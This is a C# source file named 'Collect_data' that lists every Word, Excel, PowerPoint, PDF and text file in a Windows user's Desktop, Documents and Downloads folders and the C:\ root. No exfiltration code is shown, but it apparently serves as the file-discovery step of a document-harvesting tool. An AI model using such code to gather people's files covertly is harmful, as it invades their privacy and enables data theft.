using System;
using System.IO;


namespace Collect_data
{
    class file_paths
    {
        public static string desktop = "C:\\Users\\" + Environment.UserName + "\\Desktop\\";
        public static string documents = "C:\\Users\\" + Environment.UserName + "\\Documents\\";
        public static string downloads = "C:\\Users\\" + Environment.UserName + "\\Downloads\\";
        public static string C = "C:\\";

        public static string[] files_xlsx_desktop = Directory.GetFiles(desktop, "*.xlsx", SearchOption.AllDirectories);
        public static string[] files_xlsx_documets = Directory.GetFiles(documents, "*.xlsx", SearchOption.AllDirectories);
        public static string[] files_xlsx_downloads = Directory.GetFiles(downloads, "*.xlsx", SearchOption.AllDirectories);
        public static string[] files_xlsx_C = Directory.GetFiles(C, "*.xlsx");

        public static string[] files_xls_desktop = Directory.GetFiles(desktop, "*.xls", SearchOption.AllDirectories);
        public static string[] files_xls_documets = Directory.GetFiles(documents, "*.xls", SearchOption.AllDirectories);
        public static string[] files_xls_downloads = Directory.GetFiles(downloads, "*.xls", SearchOption.AllDirectories);
        public static string[] files_xls_C = Directory.GetFiles(C, "*.xls");

        public static string[] files_docx_desktop = Directory.GetFiles(desktop, "*.docx", SearchOption.AllDirectories);
        public static string[] files_docx_documets = Directory.GetFiles(documents, "*.docx", SearchOption.AllDirectories);
        public static string[] files_docx_downloads = Directory.GetFiles(downloads, "*.docx", SearchOption.AllDirectories);
        public static string[] files_docx_C = Directory.GetFiles(C, "*.docx");

        public static string[] files_doc_desktop = Directory.GetFiles(desktop, "*.doc", SearchOption.AllDirectories);
        public static string[] files_doc_documets = Directory.GetFiles(documents, "*.doc", SearchOption.AllDirectories);
        public static string[] files_doc_downloads = Directory.GetFiles(downloads, "*.doc", SearchOption.AllDirectories);
        public static string[] files_doc_C = Directory.GetFiles(C, "*.doc");

        public static string[] files_pptx_desktop = Directory.GetFiles(desktop, "*.pptx", SearchOption.AllDirectories);
        public static string[] files_pptx_documets = Directory.GetFiles(documents, "*.pptx", SearchOption.AllDirectories);
        public static string[] files_pptx_downloads = Directory.GetFiles(downloads, "*.pptx", SearchOption.AllDirectories);
        public static string[] files_pptx_C = Directory.GetFiles(C, "*.pptx");

        public static string[] files_txt_desktop = Directory.GetFiles(desktop, "*.txt", SearchOption.AllDirectories);
        public static string[] files_txt_documets = Directory.GetFiles(documents, "*.txt", SearchOption.AllDirectories);
        public static string[] files_txt_downloads = Directory.GetFiles(downloads, "*.txt", SearchOption.AllDirectories);
        public static string[] files_txt_C = Directory.GetFiles(C, "*.txt");

        public static string[] files_pdf_desktop = Directory.GetFiles(desktop, "*.pdf", SearchOption.AllDirectories);
        public static string[] files_pdf_documets = Directory.GetFiles(documents, "*.pdf", SearchOption.AllDirectories);
        public static string[] files_pdf_downloads = Directory.GetFiles(downloads, "*.pdf", SearchOption.AllDirectories);
        public static string[] files_pdf_C = Directory.GetFiles(C, "*.pdf");
    }
}
